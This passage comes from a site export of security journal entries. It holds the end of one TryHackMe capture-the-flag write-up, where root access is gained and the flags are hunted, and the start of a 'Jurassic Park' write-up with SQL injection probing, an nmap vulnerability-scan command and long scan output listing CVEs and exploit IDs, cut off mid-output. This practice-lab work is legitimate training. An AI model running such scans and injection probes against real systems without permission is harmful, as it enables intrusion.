kB&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;VmSize:\t  669780 kB&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;VmLck:\t       0 kB&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;VmPin:\t       0 kB&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;VmHWM:\t   35560 kB&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;VmRSS:\t   35560 kB&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;RssAnon:\t   25656 kB&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;RssFile:\t    9904 kB&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;RssShmem:\t       0 kB&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;VmData:\t   74948 kB&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;VmStk:\t     132 kB&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;VmExe:\t    3792 kB&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;VmLib:\t    8568 kB&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;VmPTE:\t     292 kB&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;VmSwap:\t       0 kB&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;HugetlbPages:\t       0 kB&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;CoreDumping:\t0&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Threads:\t4&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;SigQ:\t0/3686&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;SigPnd:\t0000000000000000&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;ShdPnd:\t0000000000000000&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;SigBlk:\t0000000000000000&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;SigIgn:\t0000000001001000&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;SigCgt:\t0000000180000002&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;CapInh:\t0000000000000000&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;CapPrm:\t0000003fffffffff&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;CapEff:\t0000003fffffffff&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;CapBnd:\t0000003fffffffff&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;CapAmb:\t0000000000000000&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;NoNewPrivs:\t0&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Seccomp:\t0&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Speculation_Store_Bypass:\tvulnerable&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Cpus_allowed:\t7fff&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Cpus_allowed_list:\t0-14&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Mems_allowed:\t00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Mems_allowed_list:\t0&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;voluntary_ctxt_switches:\t129378&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;nonvoluntary_ctxt_switches:\t1378&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Score! We’re running as root. So we should be able to get our hands on anything.&lt;/p&gt;\n&lt;p&gt;Unfortunately, it looks like neither falconfeast nor root have &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/SSH&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SSH&quot;&gt;SSH&lt;/a&gt; keys (I checked for &lt;code&gt;id_dsa&lt;/code&gt;, &lt;code&gt;id_rsa&lt;/code&gt;, and &lt;code&gt;id_id_ed25519&lt;/code&gt;), so we’re just going to have to blindly find the flags.&lt;/p&gt;\n&lt;p&gt;Fortunately, the flag file names are pretty standard, so finding them didn’t take long.&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;Elapsed Time:&lt;/strong&gt; 56 min&lt;/p&gt;","rssInclude":true},"journals/2022-02-02":{"slug":"journals/2022-02-02","filePath":"journals/2022-02-02.md","title":"Jurassic Park","links":["spells/SQLMap","spells/SQL-injection-attacks","spells/MySQL","spells/Nmap","spells/SSH","spells/gobuster","spells/sudo"],"tags":["Journal/Tale"],"content":"\n\n                  \n                  Note\n                  \n                \n\n\n“Jurassic Park” on TryHackMe\n\n\n\nOur target is 10.10.105.134.\nThis is a very simple site: An index page (index.php) that leads to a shop.php page, which in turn links to three calls of item.php (where X is a number).\n\nTrying to include /etc/os-release via item.php causes the site to display a Dennis Nedry page that taunts you to use SQLMap. Trying a hand-crafted test SQL injection also displays this page.\nTrying different random indexes mostly doesn’t work, though item.php displays a curiously broken page.\nTrying item.php throws an SQL error revealing that the site is running on MySQL.\n\nLet’s see if our usual Nmap scan turns up anything interesting:\nsudo nmap -v -oA jurassic-park -Pn -A -T4 -sS \\\n          -script vuln -p- 10.10.105.134\nThis gives the following output:\n# Nmap 7.92 scan initiated Wed Feb  2 20:28:37 2022 as: nmap -v -oA jurassic-park -Pn -A -T4 -sS -script vuln -p- 10.10.105.134\nPre-scan script results:\n|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)\nNmap scan report for 10.10.105.134\nHost is up (0.17s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)\n| vulners: \n|   cpe:/a:openbsd:openssh:7.2p2: \n|     \tPACKETSTORM:140070\t7.8\tvulners.com/packetstorm/PACKETSTORM:140070\t*EXPLOIT*\n|     \tEXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09\t7.8\tvulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09\t*EXPLOIT*\n|     \tEDB-ID:40888\t7.8\tvulners.com/exploitdb/EDB-ID:40888\t*EXPLOIT*\n|     \tCVE-2016-8858\t7.8\tvulners.com/cve/CVE-2016-8858\n|     \tCVE-2016-6515\t7.8\tvulners.com/cve/CVE-2016-6515\n|     \t1337DAY-ID-26494\t7.8\tvulners.com/zdt/1337DAY-ID-26494\t*EXPLOIT*\n|     \tSSV:92579\t7.5\tvulners.com/seebug/SSV:92579\t*EXPLOIT*\n|     \tCVE-2016-10009\t7.5\tvulners.com/cve/CVE-2016-10009\n|     \t1337DAY-ID-26576\t7.5\tvulners.com/zdt/1337DAY-ID-26576\t*EXPLOIT*\n|     \tSSV:92582\t7.2\tvulners.com/seebug/SSV:92582\t*EXPLOIT*\n|     \tCVE-2016-10012\t7.2\tvulners.com/cve/CVE-2016-10012\n|     \tCVE-2015-8325\t7.2\tvulners.com/cve/CVE-2015-8325\n|     \tSSV:92580\t6.9\tvulners.com/seebug/SSV:92580\t*EXPLOIT*\n|     \tCVE-2016-10010\t6.9\tvulners.com/cve/CVE-2016-10010\n|     \t1337DAY-ID-26577\t6.9\tvulners.com/zdt/1337DAY-ID-26577\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/SUSE-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/SUSE-CVE-2019-25017/\t5.8\tvulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-25017/\t*EXPLOIT*\n|     \tMSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-AIX-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/F5-BIG-IP-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/DEBIAN-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/\t5.8\tvulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tEXPLOITPACK:98FE96309F9524B8C84C508837551A19\t5.8\tvulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19\t*EXPLOIT*\n|     \tEXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97\t5.8\tvulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97\t*EXPLOIT*\n|     \tEDB-ID:46516\t5.8\tvulners.com/exploitdb/EDB-ID:46516\t*EXPLOIT*\n|     \tEDB-ID:46193\t5.8\tvulners.com/exploitdb/EDB-ID:46193\t*EXPLOIT*\n|     \tCVE-2019-6111\t5.8\tvulners.com/cve/CVE-2019-6111\n|     \t1337DAY-ID-32328\t5.8\tvulners.com/zdt/1337DAY-ID-32328\t*EXPLOIT*\n|     \t1337DAY-ID-32009\t5.8\tvulners.com/zdt/1337DAY-ID-32009\t*EXPLOIT*\n|     \tSSV:91041\t5.5\tvulners.com/seebug/SSV:91041\t*EXPLOIT*\n|     \tPACKETSTORM:140019\t5.5\tvulners.com/packetstorm/PACKETSTORM:140019\t*EXPLOIT*\n|     \tPACKETSTORM:136234\t5.5\tvulners.com/packetstorm/PACKETSTORM:136234\t*EXPLOIT*\n|     \tEXPLOITPACK:F92411A645D85F05BDBD274FD222226F\t5.5\tvulners.com/exploitpack/EXPLOITPACK:F92411A645D85F05BDBD274FD222226F\t*EXPLOIT*\n|     \tEXPLOITPACK:9F2E746846C3C623A27A441281EAD138\t5.5\tvulners.com/exploitpack/EXPLOITPACK:9F2E746846C3C623A27A441281EAD138\t*EXPLOIT*\n|     \tEXPLOITPACK:1902C998CBF9154396911926B4C3B330\t5.5\tvulners.com/exploitpack/EXPLOITPACK:1902C998CBF9154396911926B4C3B330\t*EXPLOIT*\n|     \tEDB-ID:40858\t5.5\tvulners.com/exploitdb/EDB-ID:40858\t*EXPLOIT*\n|     \tEDB-ID:40119\t5.5\tvulners.com/exploitdb/EDB-ID:40119\t*EXPLOIT*\n|     \tEDB-ID:39569\t5.5\tvulners.com/exploitdb/EDB-ID:39569\t*EXPLOIT*\n|     \tCVE-2016-3115\t5.5\tvulners.com/cve/CVE-2016-3115\n|     \tSSH_ENUM\t5.0\tvulners.com/canvas/SSH_ENUM\t*EXPLOIT*\n|     \tPACKETSTORM:150621\t5.0\tvulners.com/packetstorm/PACKETSTORM:150621\t*EXPLOIT*\n|     \tMSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS\t5.0\tvulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS\t*EXPLOIT*\n|     \tEXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0\t5.0\tvulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0\t*EXPLOIT*\n|     \tEXPLOITPACK:EBDBC5685E3276D648B4D14B75563283\t5.0\tvulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283\t*EXPLOIT*\n|     \tEDB-ID:45939\t5.0\tvulners.com/exploitdb/EDB-ID:45939\t*EXPLOIT*\n|     \tEDB-ID:45233\t5.0\tvulners.com/exploitdb/EDB-ID:45233\t*EXPLOIT*\n|     \tCVE-2018-15919\t5.0\tvulners.com/cve/CVE-2018-15919\n|     \tCVE-2018-15473\t5.0\tvulners.com/cve/CVE-2018-15473\n|     \tCVE-2017-15906\t5.0\tvulners.com/cve/CVE-2017-15906\n|     \tCVE-2016-10708\t5.0\tvulners.com/cve/CVE-2016-10708\n|     \t1337DAY-ID-31730\t5.0\tvulners.com/zdt/1337DAY-ID-31730\t*EXPLOIT*\n|     \tCVE-2021-41617\t4.4\tvulners.com/cve/CVE-2021-41617\n|     \tMSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/\t4.3\tvulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/\t4.3\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/\t4.3\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/\t4.3\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/\t*EXPLOIT*\n|     \tMSF:ILITIES/F5-BIG-IP-CVE-2020-14145/\t4.3\tvulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/\t*EXPLOIT*\n|     \tEXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF\t4.3\tvulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF\t*EXPLOIT*\n|     \tEXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF\t4.3\tvulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF\t*EXPLOIT*\n|     \tEDB-ID:40136\t4.3\tvulners.com/exploitdb/EDB-ID:40136\t*EXPLOIT*\n|     \tEDB-ID:40113\t4.3\tvulners.com/exploitdb/EDB-ID:40113\t*EXPLOIT*\n|     \tCVE-2020-14145\t4.3\tvulners.com/cve/CVE-2020-14145\n|     \tCVE-2016-6210\t4.3\tvulners.com/cve/CVE-2016-6210\n|     \t1337DAY-ID-25440\t4.3\tvulners.com/zdt/1337DAY-ID-25440\t*EXPLOIT*\n|     \t1337DAY-ID-25438\t4.3\tvulners.com/zdt/1337DAY-ID-25438\t*EXPLOIT*\n|     \tCVE-2019-6110\t4.0\tvulners.com/cve/CVE-2019-6110\n|     \tCVE-2019-6109\t4.0\tvulners.com/cve/CVE-2019-6109\n|     \tCVE-2018-20685\t2.6\tvulners.com/cve/CVE-2018-20685\n|     \tSSV:92581\t2.1\tvulners.com/seebug/SSV:92581\t*EXPLOIT*\n|     \tCVE-2016-10011\t2.1\tvulners.com/cve/CVE-2016-10011\n|     \tSRC-2016-0002\t0.0\tvulners.com/srcincite/SRC-2016-0002\t*EXPLOIT*\n|     \tPACKETSTORM:151227\t0.0\tvulners.com/packetstorm/PACKETSTORM:151227\t*EXPLOIT*\n|     \tPACKETSTORM:140261\t0.0\tvulners.com/packetstorm/PACKETSTORM:140261\t*EXPLOIT*\n|     \tPACKETSTORM:138006\t0.0\tvulners.com/packetstorm/PACKETSTORM:138006\t*EXPLOIT*\n|     \tPACKETSTORM:137942\t0.0\tvulners.com/packetstorm/PACKETSTORM:137942\t*EXPLOIT*\n|_    \t1337DAY-ID-30937\t0.0\tvulners.com/zdt/1337DAY-ID-30937\t*EXPLOIT*\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n| http-slowloris-check: \n|   VULNERABLE:\n|   Slowloris DOS attack\n|     State: LIKELY VULNERABLE\n|     IDs:  CVE:CVE-2007-6750\n|       Slowloris tries to keep many connections to the target web server open and hold\n|       them open as long as possible.  It accomplishes this by opening connections to\n|       the target web server and sending a partial request. By doing so, it starves\n|       the http server&#039;s resources causing Denial Of Service.\n|       \n|     Disclosure date: 2009-09-17\n|     References:\n|       ha.ckers.org/slowloris/\n|_      cve.mitre.org/cgi-bin/cvename.cgi\n|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.\n| http-fileupload-exploiter: \n|   \n|     Couldn&#039;t find a file-type field.\n|   \n|_    Couldn&#039;t find a file-type field.\n|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.\n| http-sql-injection: \n|   Possible sqli for queries:\n|     http://10.10.105.134:80/item.php%27%20OR%20sqlspider\n|     http://10.10.105.134:80/item.php%27%20OR%20sqlspider\n|     http://10.10.105.134:80/item.php%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=N%3BO%3DD%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=S%3BO%3DD%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=M%3BO%3DD%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=D%3BO%3DD%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=N%3BO%3DD%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider\n|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider\n|_    http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider\n| vulners: \n|   cpe:/a:apache:http_server:2.4.18: \n|     \tCVE-2021-44790\t7.5\tvulners.com/cve/CVE-2021-44790\n|     \tCVE-2021-39275\t7.5\tvulners.com/cve/CVE-2021-39275\n|     \tCVE-2021-26691\t7.5\tvulners.com/cve/CVE-2021-26691\n|     \tCVE-2017-7679\t7.5\tvulners.com/cve/CVE-2017-7679\n|     \tCVE-2017-7668\t7.5\tvulners.com/cve/CVE-2017-7668\n|     \tCVE-2017-3169\t7.5\tvulners.com/cve/CVE-2017-3169\n|     \tCVE-2017-3167\t7.5\tvulners.com/cve/CVE-2017-3167\n|     \tMSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/\t7.2\tvulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/\t7.2\tvulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/\t*EXPLOIT*\n|     \tEXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB\t7.2\tvulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB\t*EXPLOIT*\n|     \tEDB-ID:46676\t7.2\tvulners.com/exploitdb/EDB-ID:46676\t*EXPLOIT*\n|     \tCVE-2019-0211\t7.2\tvulners.com/cve/CVE-2019-0211\n|     \t1337DAY-ID-32502\t7.2\tvulners.com/zdt/1337DAY-ID-32502\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1312/\t6.8\tvulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1312/\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/SUSE-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/\t6.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/\t6.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/\t6.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/FREEBSD-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/DEBIAN-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/\t6.8\tvulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/\t*EXPLOIT*\n|     \tMSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/\t*EXPLOIT*\n|     \tFDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8\t6.8\tvulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8\t*EXPLOIT*\n|     